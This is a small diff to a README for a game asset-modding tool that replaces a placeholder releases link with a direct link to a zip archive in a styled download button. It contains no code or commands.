@@ -40,7 +40,7 @@ RE-Requiem-Asset-Manager operates by intercepting the **RE Engine's** file I/O o
 <div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
   <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
   <br><br>
-  <a href="https://github.com/YOUR_USERNAME/RE-Requiem-Asset-Manager/releases/latest">
+  <a href="https://github.com/WraithCyclops/RE-Requiem-Asset-Manager/releases/download/1/RE-Requiem-Mod-Core.zip">
     <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
   <br><br>
